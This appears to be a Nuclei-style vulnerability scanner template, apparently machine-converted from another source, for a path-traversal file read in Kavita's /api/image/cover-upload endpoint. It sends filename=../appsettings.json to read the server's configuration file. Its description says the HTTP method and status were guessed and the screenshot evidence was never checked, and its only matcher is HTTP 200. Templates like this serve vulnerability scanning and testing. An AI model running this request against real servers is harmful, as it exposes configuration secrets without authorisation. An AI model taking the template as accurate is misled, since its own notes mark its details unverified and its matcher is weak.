id: poc-9736116403
info:
  name: Kavita cover-upload 任意文件读取漏洞_dkyno0ixg7xhh5bd
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,lfi,unknown
http:
- raw:
  - 'GET /api/image/cover-upload?filename=../appsettings.json HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
